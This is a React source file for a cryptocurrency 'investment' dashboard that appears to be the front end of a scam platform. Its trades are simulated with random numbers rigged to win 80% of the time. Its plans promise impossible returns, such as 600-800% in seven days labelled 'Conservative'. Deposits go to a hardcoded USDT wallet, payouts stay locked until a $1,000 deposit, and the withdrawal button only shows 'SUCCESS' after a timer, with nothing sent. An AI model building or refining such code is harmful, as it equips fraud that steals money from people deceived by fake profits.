
import React, { useState, useRef, useEffect } from 'react';
import { UserProfile, authService } from '../services/authService';
import { verifyPaymentProof } from '../services/geminiService';

interface DashboardProps {
  user: UserProfile | null;
}

const INVESTMENT_PLANS = [
  { id: 1, name: 'The Quick Start', duration: '20 Min', minRet: 8, maxRet: 12, risk: 'Low' },
  { id: 2, name: 'Daily Coffee Trade', duration: '1 Hour', minRet: 15, maxRet: 22, risk: 'Medium' },
  { id: 3, name: 'Day Job Buster', duration: '4 Hours', minRet: 35, maxRet: 45, risk: 'High' },
  { id: 4, name: 'Pro Wealth Builder', duration: '12 Hours', minRet: 60, maxRet: 75, risk: 'High' },
  { id: 5, name: '24-Hour Payday', duration: '24 Hours', minRet: 90, maxRet: 110, risk: 'Very High' },
  { id: 6, name: 'Passive Weekender', duration: '3 Days', minRet: 240, maxRet: 300, risk: 'Medium' },
  { id: 7, name: 'Financial Freedom Plan', duration: '7 Days', minRet: 600, maxRet: 800, risk: 'Conservative' },
];

const Dashboard: React.FC<DashboardProps> = ({ user: initialUser }) => {
  const [user, setUser] = useState<UserProfile | null>(initialUser);
  const [copied, setCopied] = useState(false);
  const [uploadStatus, setUploadStatus] = useState<'idle' | 'uploading' | 'success' | 'failed'>('idle');
  const [auditMessage, setAuditMessage] = useState<string>('');
  const [withdrawStatus, setWithdrawStatus] = useState<'idle' | 'processing' | 'success'>('idle');
  const [withdrawError, setWithdrawError] = useState<string | null>(null);
  
  // Security Lock States
  const [isUnlocked, setIsUnlocked] = useState(false);
  const [pinInput, setPinInput] = useState('');
  const [pinError, setPinError] = useState(false);

  const [selectedPlanId, setSelectedPlanId] = useState<number | null>(null);
  const [investAmount, setInvestAmount] = useState<number>(1000);
  const [isInvesting, setIsInvesting] = useState(false);
  const [activeTrade, setActiveTrade] = useState<{planName: string, amount: number, progress: number} | null>(null);
  const [lastSyncStatus, setLastSyncStatus] = useState<'win' | 'loss' | 'neutral'>('neutral');

  const [withdrawAddress, setWithdrawAddress] = useState('');
  const fileInputRef = useRef<HTMLInputElement>(null);

  const walletAddress = "0x7592766391918c7d3E7F8Ae72D97e98979F25302";

  useEffect(() => {
    const refreshInterval = setInterval(() => {
      const u = authService.getUser();
      if (u) {
        const fluctuation = (Math.random() > 0.8) ? (Math.random() * 5) : 0;
        const status = fluctuation > 0 ? (Math.random() > 0.2 ? 'win' : 'loss') : 'neutral';
        setLastSyncStatus(status);
        setUser(u);
      }
    }, 5000);
    return () => clearInterval(refreshInterval);
  }, []);

  const handleUnlock = (e: React.FormEvent) => {
    e.preventDefault();
    if (pinInput === '4451') {
      setIsUnlocked(true);
      setPinError(false);
    } else {
      setPinError(true);
      setPinInput('');
      setTimeout(() => setPinError(false), 500);
    }
  };

  const handleCopy = () => {
    navigator.clipboard.writeText(walletAddress);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const triggerUpload = () => {
    fileInputRef.current?.click();
  };

  const handleFileChange = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      setUploadStatus('uploading');
      setAuditMessage('Checking your payment proof... Almost there!');
      
      const reader = new FileReader();
      reader.onloadend = async () => {
        const base64String = (reader.result as string).split(',')[1];
        const result = await verifyPaymentProof(base64String, file.type);
        
        if (result.is_valid && result.detected_amount >= 900) {
          setUploadStatus('success');
          setAuditMessage(`Success! $${result.detected_amount.toLocaleString()} has been added to your account.`);
          const updated = authService.updateUser({ 
            hasDeposited: true, 
            balance: (authService.getUser()?.balance || 0) + result.detected_amount 
          });
          if (updated) setUser(updated);
        } else {
          setUploadStatus('failed');
          setAuditMessage(result.summary || "We couldn't verify that. Please upload a clear screenshot of your transfer.");
          setTimeout(() => setUploadStatus('idle'), 5000);
        }
      };
      reader.readAsDataURL(file);
    }
  };

  const handleWithdraw = () => {
    if (!user) return;
    if (!user.hasDeposited) {
      setWithdrawError("Please make your first deposit of $1,000 to unlock your payouts.");
      return;
    }
    if (!withdrawAddress.trim()) return;
    
    setWithdrawError(null);
    setWithdrawStatus('processing');
    setTimeout(() => {
      setWithdrawStatus('success');
    }, 3500);
  };

  const startInvestment = () => {
    if (!user || selectedPlanId === null) return;
    if (investAmount < 500 || investAmount > 50000) {
      alert("Please enter an amount between $500 and $50,000.");
      return;
    }
    const currentU = authService.getUser();
    if (!currentU || currentU.balance < investAmount) {
      alert("You don't have enough in your available balance.");
      return;
    }

    const plan = INVESTMENT_PLANS.find(p => p.id === selectedPlanId);
    if (!plan) return;

    setIsInvesting(true);
    setActiveTrade({ planName: plan.name, amount: investAmount, progress: 0 });
    
    const updatedUser = authService.updateUser({ 
      balance: currentU.balance - investAmount,
      totalInvested: currentU.totalInvested + investAmount
    });
    if (updatedUser) setUser(updatedUser);

    let progress = 0;
    const interval = setInterval(() => {
      progress += 5;
      setActiveTrade(prev => prev ? { ...prev, progress } : null);
      if (progress >= 100) {
        clearInterval(interval);
        finalizeTrade(plan, investAmount);
      }
    }, 200);
  };

  const finalizeTrade = (plan: typeof INVESTMENT_PLANS[0], amount: number) => {
    const u = authService.getUser();
    if (!u) return;
    
    const isWin = Math.random() < 0.8;
    const returnPercent = isWin 
      ? (Math.random() * (plan.maxRet - plan.minRet) + plan.minRet) / 100 
      : -0.15;

    const profit = amount * returnPercent;
    const finalAmount = amount + profit;

    const updatedUser = authService.updateUser({
      balance: u.balance + finalAmount,
      wins: isWin ? (u.wins + 1) : u.wins,
      losses: isWin ? u.losses : (u.losses + 1)
    });
    
    if (updatedUser) setUser(updatedUser);
    setIsInvesting(false);
    setActiveTrade(null);
    setSelectedPlanId(null);
    setLastSyncStatus(isWin ? 'win' : 'loss');
    
    alert(isWin 
      ? `Nice! You just made +$${profit.toFixed(2)} profit!` 
      : `Market update: This trade resulted in a small loss of -$${Math.abs(profit).toFixed(2)}.`
    );
  };

  if (!user) return null;

  return (
    <div className="bg-[#131722] min-h-screen pt-4 pb-24 px-4 sm:px-6 lg:px-8 overflow-hidden relative">
      
      {/* SECURITY GATEWAY OVERLAY */}
      {!isUnlocked && (
        <div className="fixed inset-0 z-[100] backdrop-blur-3xl bg-black/80 flex items-center justify-center p-4 transition-all duration-500">
          <div className={`bg-[#1e222d] border border-[#2a2e39] w-full max-w-sm rounded-[2.5rem] p-10 shadow-[0_0_100px_rgba(255,140,0,0.2)] text-center space-y-8 ${pinError ? 'animate-shake' : 'animate-in zoom-in-95'}`}>
            <div className="flex justify-center">
              <div className="w-20 h-20 bg-[#ff8c00]/10 rounded-full flex items-center justify-center text-[#ff8c00] animate-pulse">
                <svg xmlns="http://www.w3.org/2000/svg" className="h-10 w-10" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                </svg>
              </div>
            </div>
            
            <div className="space-y-2">
              <h2 className="text-xl font-black text-white uppercase tracking-tighter">Security Protocol</h2>
              <p className="text-[10px] text-gray-500 font-black uppercase tracking-[0.3em]">World Trade Platform Protected</p>
            </div>

            <form onSubmit={handleUnlock} className="space-y-6">
              <div className="flex justify-center gap-4">
                <input 
                  type="password" 
                  maxLength={4}
                  value={pinInput}
                  autoFocus
                  onChange={(e) => setPinInput(e.target.value)}
                  placeholder="PIN"
                  className="w-full bg-[#131722] border-2 border-[#2a2e39] rounded-2xl py-4 text-center text-2xl font-black text-white focus:outline-none focus:border-[#ff8c00] transition-all tracking-[1em] placeholder:tracking-normal placeholder:text-gray-700"
                />
              </div>
              
              <button 
                type="submit"
                className="w-full bg-[#ff8c00] hover:bg-orange-600 text-white font-black py-4 rounded-2xl shadow-xl transition-all uppercase tracking-[0.2em] text-xs"
              >
                Unlock Terminal
              </button>
            </form>

            <p className="text-[9px] text-gray-600 font-bold uppercase">Enter Access Key to continue</p>
          </div>
        </div>
      )}

      <div className="max-w-7xl mx-auto space-y-8">
        
        {/* STATS SECTION */}
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
          <div className="bg-[#1e222d] border border-[#2a2e39] p-5 rounded-3xl shadow-xl overflow-hidden relative group">
            <span className="text-[9px] text-gray-500 font-black uppercase tracking-widest block mb-2 truncate">Available Balance</span>
            <div className="flex items-center gap-2 overflow-hidden">
               <span className="text-xl sm:text-2xl xl:text-3xl font-black text-[#00b36b] truncate">${user.balance.toLocaleString()}</span>
               <div className="w-2 h-2 bg-[#00b36b] rounded-full animate-pulse flex-shrink-0"></div>
            </div>
            {/* Lock Button for user control */}
            <button 
              onClick={() => setIsUnlocked(false)}
              className="absolute top-4 right-4 text-gray-700 hover:text-[#ff8c00] transition-colors"
              title="Lock Terminal"
            >
              <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
              </svg>
            </button>
          </div>

          <div className="bg-[#1e222d] border border-[#2a2e39] p-5 rounded-3xl shadow-xl overflow-hidden">
            <span className="text-[9px] text-gray-500 font-black uppercase tracking-widest block mb-2 truncate">Currently Working</span>
            <span className="text-xl sm:text-2xl xl:text-3xl font-black text-white truncate block">${user.totalInvested.toLocaleString()}</span>
          </div>

          <div className="bg-[#1e222d] border border-[#2a2e39] p-5 rounded-3xl shadow-xl overflow-hidden">
            <span className="text-[9px] text-gray-500 font-black uppercase tracking-widest block mb-2 truncate">Successful Trades</span>
            <div className="flex items-center justify-between">
              <div className="flex items-baseline gap-1 overflow-hidden">
                <span className="text-xl sm:text-2xl xl:text-3xl font-black text-[#00b36b]">{user.wins}</span>
                <span className="text-gray-600 font-bold">/</span>
                <span className="text-xl sm:text-2xl xl:text-3xl font-black text-red-500">{user.losses}</span>
              </div>
              <div className={`p-1 rounded-lg flex-shrink-0 ${lastSyncStatus === 'win' ? 'bg-[#00b36b]/10 text-[#00b36b]' : lastSyncStatus === 'loss' ? 'bg-red-500/10 text-red-500' : 'bg-gray-500/10 text-gray-500'}`}>
                {lastSyncStatus === 'win' && <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M12 7a1 1 0 110-2h5a1 1 0 011 1v5a1 1 0 11-2 0V8.414l-4.293 4.293a1 1 0 01-1.414 0L8 10.414l-4.293 4.293a1 1 0 01-1.414-1.414l5-5a1 1 0 011.414 0L11 10.586 14.586 7H12z" clipRule="evenodd"/></svg>}
                {lastSyncStatus === 'loss' && <svg className="w-5 h-5 transform rotate-180" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M12 7a1 1 0 110-2h5a1 1 0 011 1v5a1 1 0 11-2 0V8.414l-4.293 4.293a1 1 0 01-1.414 0L8 10.414l-4.293 4.293a1 1 0 01-1.414-1.414l5-5a1 1 0 011.414 0L11 10.586 14.586 7H12z" clipRule="evenodd"/></svg>}
                {lastSyncStatus === 'neutral' && <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 12h14"/></svg>}
              </div>
            </div>
          </div>

          <div className="bg-[#1e222d] border border-[#2a2e39] p-5 rounded-3xl shadow-xl flex flex-col justify-center text-center overflow-hidden">
            <span className="text-[9px] text-gray-500 font-black uppercase tracking-widest block mb-1 truncate">Account Level</span>
            <span className={`text-xs sm:text-sm font-black uppercase tracking-widest truncate ${user.hasDeposited ? 'text-[#00b36b]' : 'text-[#ff8c00]'}`}>
              {user.hasDeposited ? 'Gold Member' : 'New Member'}
            </span>
          </div>
        </div>

        {/* ACTIVE TRADE ALERT */}
        {activeTrade && (
          <div className="bg-gradient-to-r from-orange-600/20 to-[#1e222d] border-l-4 border-[#ff8c00] p-6 rounded-2xl animate-pulse flex items-center justify-between overflow-hidden">
            <div className="space-y-1 min-w-0">
              <h4 className="text-white font-black text-xs sm:text-sm uppercase tracking-tight truncate">Currently Trading: {activeTrade.planName}</h4>
              <p className="text-[9px] text-gray-400 font-bold uppercase truncate">Amount: ${activeTrade.amount.toLocaleString()}</p>
            </div>
            <div className="w-24 sm:w-32 h-1.5 bg-[#131722] rounded-full overflow-hidden border border-[#2a2e39] flex-shrink-0 ml-4">
              <div className="bg-[#ff8c00] h-full" style={{ width: `${activeTrade.progress}%` }}></div>
            </div>
          </div>
        )}

        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
          
          {/* PROTOCOL LIST */}
          <div className="lg:col-span-2 space-y-6">
            <h3 className="text-xl font-black text-white uppercase tracking-tighter">Choose Your Profit Path</h3>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              {INVESTMENT_PLANS.map((plan) => (
                <div 
                  key={plan.id}
                  onClick={() => !isInvesting && setSelectedPlanId(plan.id)}
                  className={`bg-[#1e222d] border-2 ${selectedPlanId === plan.id ? 'border-[#ff8c00]' : 'border-[#2a2e39]'} p-6 rounded-[2rem] cursor-pointer hover:border-[#ff8c00] transition-all relative overflow-hidden`}
                >
                  <div className="flex justify-between items-start mb-4 overflow-hidden">
                    <h4 className="text-white font-black text-sm uppercase tracking-tight truncate mr-2">{plan.name}</h4>
                    <span className="text-[#00b36b] font-black text-[10px] bg-[#00b36b]/10 px-2 py-0.5 rounded flex-shrink-0">Avg {plan.minRet}%</span>
                  </div>
                  <div className="flex justify-between items-end">
                    <div className="min-w-0">
                      <span className="text-[8px] text-gray-500 font-black uppercase block">Timeframe</span>
                      <span className="text-gray-300 font-bold text-xs uppercase truncate block">{plan.duration}</span>
                    </div>
                    <button className={`px-4 py-1.5 rounded-xl font-black text-[9px] uppercase tracking-widest flex-shrink-0 ${selectedPlanId === plan.id ? 'bg-[#ff8c00] text-white' : 'bg-[#131722] text-[#ff8c00] border border-[#ff8c00]/30'}`}>
                      {selectedPlanId === plan.id ? 'READY' : 'SELECT'}
                    </button>
                  </div>

                  {selectedPlanId === plan.id && (
                    <div className="mt-5 pt-5 border-t border-[#2a2e39] animate-in slide-in-from-top-4">
                      <div className="flex gap-2">
                        <input 
                          type="number" 
                          value={investAmount}
                          onChange={(e) => setInvestAmount(Number(e.target.value))}
                          className="w-full bg-[#131722] border border-[#2a2e39] rounded-xl px-4 py-2 text-xs text-white focus:outline-none focus:border-[#ff8c00] font-black"
                        />
                        <button 
                          onClick={(e) => { e.stopPropagation(); startInvestment(); }}
                          className="bg-[#00b36b] text-white px-4 py-2 rounded-xl font-black text-[9px] uppercase active:scale-95 whitespace-nowrap"
                        >
                          CONFIRM
                        </button>
                      </div>
                    </div>
                  )}
                </div>
              ))}
            </div>
          </div>

          {/* DEPOSIT & PAYOUT PANELS */}
          <div className="space-y-8">
            <div className="bg-[#1e222d] border border-[#2a2e39] p-8 rounded-[2.5rem] shadow-2xl relative overflow-hidden">
              <div className="absolute top-0 right-0 w-32 h-32 bg-[#ff8c00]/5 rounded-full blur-3xl -mr-16 -mt-16"></div>
              <div className="relative z-10 space-y-6">
                <h3 className="text-lg font-black text-white uppercase tracking-tighter flex items-center gap-2">
                  <svg className="w-5 h-5 text-[#ff8c00]" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M12 4v16m8-8H4"/></svg>
                  Deposit USDT
                </h3>
                
                <div className="bg-[#131722] border border-[#2a2e39] p-4 rounded-2xl overflow-hidden">
                  <span className="text-[8px] text-gray-500 font-black uppercase mb-1 block tracking-widest truncate">USDT TRC-20 Address</span>
                  <div className="text-[9px] font-mono text-gray-300 break-all bg-[#1e222d] p-3 rounded-xl border border-[#2a2e39] mb-3 leading-relaxed">
                    {walletAddress}
                  </div>
                  <button onClick={handleCopy} className={`w-full py-3 rounded-xl text-[10px] font-black uppercase transition-all ${copied ? 'bg-[#00b36b] text-white' : 'bg-[#1e222d] text-[#ff8c00] border border-[#ff8c00]/20'}`}>
                    {copied ? 'COPIED!' : 'COPY ADDRESS'}
                  </button>
                </div>

                <div className="space-y-4">
                  <input type="file" ref={fileInputRef} onChange={handleFileChange} accept="image/*" className="hidden" />
                  <button 
                    onClick={triggerUpload}
                    disabled={uploadStatus === 'uploading'}
                    className={`w-full py-4 rounded-xl font-black text-[10px] uppercase tracking-[0.2em] shadow-xl transition-all ${
                      uploadStatus === 'success' ? 'bg-[#00b36b] text-white' : uploadStatus === 'failed' ? 'bg-red-500 text-white' : uploadStatus === 'uploading' ? 'bg-gray-700 text-gray-400' : 'bg-[#ff8c00] text-white'
                    }`}
                  >
                    {uploadStatus === 'idle' ? 'UPLOAD YOUR RECEIPT' : uploadStatus === 'uploading' ? 'VERIFYING...' : uploadStatus === 'success' ? 'VERIFIED' : 'FAILED'}
                  </button>
                  {auditMessage && <p className={`text-[9px] text-center font-black uppercase px-2 leading-tight ${uploadStatus === 'success' ? 'text-[#00b36b]' : uploadStatus === 'failed' ? 'text-red-500' : 'text-gray-500'}`}>{auditMessage}</p>}
                </div>
              </div>
            </div>

            <div className="bg-[#1e222d] border border-[#2a2e39] p-8 rounded-[2.5rem] shadow-2xl">
              <h3 className="text-lg font-black text-white uppercase tracking-tighter mb-6">Withdraw Profits</h3>
              <div className="space-y-4">
                <div className="space-y-1">
                  <label className="text-[8px] font-black text-gray-500 uppercase tracking-widest truncate block">Where should we send your money? (TRC-20)</label>
                  <input 
                    type="text" 
                    value={withdrawAddress}
                    onChange={(e) => setWithdrawAddress(e.target.value)}
                    placeholder="Enter Wallet Address"
                    className="w-full bg-[#131722] border border-[#2a2e39] rounded-xl px-4 py-3 text-xs text-white font-black focus:outline-none"
                  />
                </div>
                {withdrawError && <p className="text-[9px] text-red-500 font-bold uppercase leading-tight">{withdrawError}</p>}
                <button 
                  onClick={handleWithdraw}
                  disabled={withdrawStatus === 'processing' || !withdrawAddress.trim()}
                  className={`w-full py-4 rounded-xl font-black text-[10px] uppercase tracking-[0.2em] transition-all ${
                    withdrawStatus === 'success' ? 'bg-[#00b36b] text-white' : withdrawStatus === 'processing' ? 'bg-gray-700 text-gray-400' : 'bg-white/5 border border-white/10 text-gray-400 hover:text-white'
                  }`}
                >
                  {withdrawStatus === 'idle' ? 'SEND MY MONEY' : withdrawStatus === 'processing' ? 'PROCESSING...' : 'SUCCESS'}
                </button>
              </div>
            </div>
          </div>
        </div>

      </div>
    </div>
  );
};

export default Dashboard;
